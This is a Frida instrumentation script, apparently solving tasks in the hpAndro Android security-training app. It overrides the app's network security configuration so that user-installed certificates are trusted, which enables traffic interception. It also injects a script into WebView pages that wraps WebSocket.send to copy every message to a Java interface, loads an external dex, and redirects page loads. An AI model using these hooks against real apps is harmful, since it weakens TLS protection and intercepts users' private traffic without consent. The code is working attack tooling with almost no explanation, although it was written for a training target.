Java.perform(function(){
      var ANDROID_VERSION_M = 23;

      var DefaultConfigSource = Java.use("android.security.net.config.ManifestConfigSource$DefaultConfigSource");
      var NetworkSecurityConfig = Java.use("android.security.net.config.NetworkSecurityConfig");
      var ManifestConfigSource = Java.use("android.security.net.config.ManifestConfigSource");

      var NetworkSecurityTrustManager = Java.use("android.security.net.config.NetworkSecurityTrustManager");

      ManifestConfigSource.getConfigSource.implementation = function () {
            
            var bt = Java.use("android.util.Log").getStackTraceString(Java.use("java.lang.Exception").$new());
            //console.log("\nBacktrace:\n" + bt);
        
            console.log("[+] Modifying ManifestConfigSource getConfigSource");
            //if the API is <= 25 the DefaultConfigSource has 2 methods, if not it has 3.
            if (DefaultConfigSource.$new.argumentTypes.length == 2) {
              //if API >= 28 second parameter is ApplicationInfo
              if (DefaultConfigSource.$new.argumentTypes[1].className == "android.content.pm.ApplicationInfo") {
                var ApplicationInfo = Java.use("android.content.pm.ApplicationInfo");
                var appInstance = ApplicationInfo.$new();
                appInstance.targetSdkVersion.value = ANDROID_VERSION_M;
                appInstance.targetSandboxVersion.value = 1;
                return DefaultConfigSource.$new(true,appInstance);
              } else {
                return DefaultConfigSource.$new(true,ANDROID_VERSION_M);        
              } 
            } else {
              return DefaultConfigSource.$new(true,ANDROID_VERSION_M,ANDROID_VERSION_M);
            }
            
      }

      var RootTrustManager = Java.use("android.security.net.config.RootTrustManager");

      RootTrustManager.$init.implementation = function (applicationconfig) {
        var bt = Java.use("android.util.Log").getStackTraceString(Java.use("java.lang.Exception").$new());
        //console.log("\nBacktrace:\n" + bt);
        return this.$init(applicationconfig);    
      } 

      NetworkSecurityTrustManager.$init.implementation = function (networksecconfig) {
        var bt = Java.use("android.util.Log").getStackTraceString(Java.use("java.lang.Exception").$new());
        //console.log("\nBacktrace:\n" + bt);
        return this.$init(networksecconfig);    
      }

});


function readNewStream(inputStream) {

	var BufferedReader = Java.use('java.io.BufferedReader'); 
	var InputStreamReader = Java.use('java.io.InputStreamReader');
	var inputStreamReader = InputStreamReader.$new(inputStream);
    
    var r = BufferedReader.$new(inputStreamReader);
    
	var StringBuilder = Java.use('java.lang.StringBuilder');
	var total = StringBuilder.$new();
    var String = Java.use('java.lang.String');
	while (true) {
    	var line = r.readLine();
    	if (line == null) {
    		break;
    	} else {
    		total.append(line).append(String.$new('\n'));
    	}
    }
    return "<script>WebSocket.prototype.send2 = WebSocket.prototype.send; WebSocket.prototype.send = function (msg) { JInterface.sendMessage(msg); this.send2(msg); }</script>" + total.toString();
}
/*

//run this at step 4-1
Java.perform( function () {

	Java.openClassFile("/data/data/com.hpandro.androidsecurity/files/injectable.dex").load();
});


//run this at step 4-2
Java.perform( function () {

	var newClass = Java.use("com.hpandro.example.JInterfaceInternal");
	
	var a = Java.use('v0.a.a.a.a');
	a.J.implementation = function (webView, str, z, z2, z3, z4, z5) {	
		console.log("entra aca");
		webView.getSettings().setMixedContentMode(0);
		newClass.setJavaInterface(webView);
		return this.J(webView, str, z, z2, z3, z4, z5);
	}
		
	newClass.showMessage.implementation = function (message) {
		console.log("siii bebote!!! " + message);
	}
	var WebViewClient = Java.use('v0.d.a.c.a.d.j.b');
	WebViewClient.shouldInterceptRequest.overload('android.webkit.WebView', 'android.webkit.WebResourceRequest').implementation = function (webView, request) {

		var WebResourceResponse = Java.use('android.webkit.WebResourceResponse');
		var isFavicon = request.getUrl().toString().search("favicon.ico") > 0 || request.getUrl().toString().search("mytheme.min.css") > 0;
		
		var URL = Java.use('java.net.URL');
		var url = URL.$new(request.getUrl().toString());
	    
	    var HttpURLConnection = Java.use('java.net.HttpURLConnection');
		var urlConnection = Java.cast(url.openConnection(),HttpURLConnection);
	    
	    var String = Java.use('java.lang.String');
		urlConnection.setRequestProperty(String.$new("User-Agent"), String.$new("hpAndro"));
	    
	    var BufferedInputStream = Java.use('java.io.BufferedInputStream');
	    var inputStr = BufferedInputStream.$new(urlConnection.getInputStream());
	    var webResourceRes = null;
	    if (!isFavicon) {
	    	var strToPrint = readNewStream(inputStr);
	    	//convert to inputStr
	    	var resultado = String.$new(strToPrint);
            var ByteArrayInputStream = Java.use("java.io.ByteArrayInputStream");
	    	var byteArrayInputStream = ByteArrayInputStream.$new(resultado.getBytes());
            var InputStream = Java.use("java.io.InputStream");
	    	var newInputStream = Java.cast(byteArrayInputStream,InputStream);            
		    webResourceRes = WebResourceResponse.$new("text/html","utf-8", newInputStream);
		} else {
			webResourceRes = WebResourceResponse.$new("image/vnd.microsoft.icon","gzip", inputStr);
		}
	    return webResourceRes;
	}
	
	var String = Java.use("java.lang.String");
	
	console.log("funca");
	
	var WebView = Java.use("android.webkit.WebView");
	WebView.loadUrl.overload("java.lang.String").implementation = function (theUrl) {
		if (theUrl.indexOf("ws_task.php") > 0) {
			this.loadUrl(String.$new("https://hpandro.raviramesh.info/ws_task.php") );
		} else {
			this.loadUrl(theUrl);
		}
	}
});
*/


